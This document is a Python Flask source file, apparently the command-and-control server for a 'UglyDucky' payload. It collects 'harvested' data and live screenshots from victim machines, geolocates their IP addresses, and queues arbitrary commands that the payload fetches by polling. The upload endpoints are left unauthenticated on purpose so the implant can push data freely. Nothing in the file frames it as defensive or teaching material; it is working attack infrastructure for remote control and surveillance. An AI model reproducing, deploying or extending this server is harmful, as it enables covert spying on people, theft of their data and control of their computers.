# File: c2_listener.py
import os
import requests
from flask import Flask, request, jsonify
from flask_cors import CORS
from datetime import datetime, timedelta, timezone

app = Flask(__name__)
# Enable CORS so the frontend can communicate with this API
CORS(app)

# Credentials from Render Environment Variables
SUPABASE_URL = os.environ.get("SUPABASE_URL")
SUPABASE_KEY = os.environ.get("SUPABASE_KEY") # MAKE SURE THIS IS THE SERVICE_ROLE KEY!

# --- NEW SECURITY MEASURE ---
# This stops random people from guessing your Render URL and reading your logs.
# You can change "ducky_admin_2024" to any secret password you want.
DASHBOARD_PASSWORD = os.environ.get("DASHBOARD_PASSWORD", "ducky_admin_2024")

command_queue = {}
screen_frames = {} # NEW: Store latest screen frames for live viewing

# ---------------------------------------------------------
# HELPER FUNCTIONS
# ---------------------------------------------------------
def get_node_status(last_seen_str):
    if not last_seen_str: 
        return "red", "Offline"
    last_seen = datetime.fromisoformat(last_seen_str).replace(tzinfo=timezone.utc)
    now = datetime.now(timezone.utc)
    
    if now - last_seen < timedelta(minutes=2): 
        return "green", "Online"
    if now - last_seen < timedelta(hours=1): 
        return "yellow", "Idle"
    return "red", "Offline"

def geolocate_ip(ip):
    if not ip or ip in ["127.0.0.1", "Unknown"]: 
        return 28.5383, -81.3792 
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=5)
        if response.ok:
            data = response.json()
            if data.get("status") == "success":
                return float(data.get("lat")), float(data.get("lon"))
    except:
        pass
    return 28.5383, -81.3792 

# ---------------------------------------------------------
# DASHBOARD ENDPOINTS (Proxy to Supabase)
# ---------------------------------------------------------
@app.route('/node/<device_id>', methods=['GET'])
def get_single_node(device_id):
    """Fetches summary data (IP, OS, Last Seen, Location) for ONE node."""
    # SECURITY CHECK: Make sure the request came from your dashboard
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase key/URL missing in Render Environment"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    
    try:
        time_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&select=created_at&order=created_at.desc&limit=1"
        response = requests.get(time_url, headers=headers)
        response.raise_for_status()
        device_data = response.json()

        if not device_data:
            return jsonify({"error": "Node not found"}), 404

        last_seen = device_data[0]['created_at']
        sysinfo_url = f"{SUPABASE_URL}?device_id=eq.{device_id}&category=eq.System Info&select=content&limit=1"
        sysinfo_resp = requests.get(sysinfo_url, headers=headers)
        
        os_info, ip_info = "Windows (Assumed)", "Unknown IP"
        if sysinfo_resp.ok and sysinfo_resp.json():
            content = sysinfo_resp.json()[0]['content']
            for line in content.split('\n'):
                if line.startswith('Caption='): 
                    os_info = line.split('=')[-1].strip()
                elif line.startswith('PUBLIC IP:'): 
                    ip_info = line.split(':')[-1].strip()

        status_color, _ = get_node_status(last_seen)
        lat, lng = geolocate_ip(ip_info)
        
        return jsonify({
            "id": device_id, "os": os_info, "ip": ip_info, "lat": lat, "lng": lng,
            "status": status_color, "last_seen": last_seen
        })

    except requests.exceptions.RequestException as e:
        return jsonify({"error": f"Failed to fetch from Supabase: {e}"}), 500

@app.route('/logs/<device_id>', methods=['GET'])
def get_logs(device_id):
    """Fetches all harvested data logs for ONE node."""
    # SECURITY CHECK: Make sure the request came from your dashboard
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401

    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}"}
    url = f"{SUPABASE_URL}?device_id=eq.{device_id}&order=created_at.desc"
    try:
        response = requests.get(url, headers=headers, timeout=10)
        response.raise_for_status()
        return jsonify(response.json()), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database fetch failed"}), 500

# ---------------------------------------------------------
# PAYLOAD ENDPOINTS
# ---------------------------------------------------------
@app.route('/logs', methods=['POST'])
def push_logs():
    """Payload posts new harvested data here."""
    # Note: No password check here so the payload can freely push data
    if not SUPABASE_KEY or not SUPABASE_URL:
        return jsonify({"error": "Supabase Configuration missing"}), 500

    headers = {"apikey": SUPABASE_KEY, "Authorization": f"Bearer {SUPABASE_KEY}", "Prefer": "return=minimal,resolution=merge-duplicates"}
    upsert_url = f"{SUPABASE_URL}?on_conflict=device_id,category"
    try:
        response = requests.post(upsert_url, json=request.json, headers=headers, timeout=15)
        response.raise_for_status()
        return jsonify({"status": "success"}), 200
    except requests.exceptions.RequestException: 
        return jsonify({"error": "Database push failed"}), 500

@app.route('/screen/<device_id>', methods=['POST', 'GET'])
def handle_screen(device_id):
    """Handles screen sharing frames. POST from payload, GET from dashboard."""
    # Payload posts base64 frames here
    if request.method == 'POST':
        data = request.json
        if not data or 'frame' not in data:
            return jsonify({"error": "Missing frame data"}), 400
        # Store the latest frame in the in-memory dictionary
        screen_frames[device_id] = data['frame']
        return jsonify({"status": "frame received"}), 200

    # Dashboard gets the latest frame from here
    if request.method == 'GET':
        # SECURITY CHECK: Make sure the request came from your dashboard
        if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
            return jsonify({"error": "Unauthorized access"}), 401
        
        frame = screen_frames.get(device_id, None)
        return jsonify({"frame": frame})

@app.route('/issue', methods=['POST'])
def issue_command():
    # SECURITY CHECK: Only Dashboard can issue commands
    if request.headers.get("X-Dashboard-Password") != DASHBOARD_PASSWORD:
        return jsonify({"error": "Unauthorized access"}), 401
        
    data = request.json
    device_id = data.get('device_id')
    command = data.get('command')
    if not device_id or not command: 
        return jsonify({"error": "device_id and command are required"}), 400
    command_queue[device_id] = command
    return jsonify({"status": "command queued"}), 200

@app.route('/poll/<device_id>', methods=['GET'])
def poll_for_command(device_id):
    """Payload continuously asks this endpoint for commands."""
    command = command_queue.pop(device_id, None)
    return jsonify({"command": command})

@app.route('/')
def index(): 
    return "UglyDucky Secure Server."

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
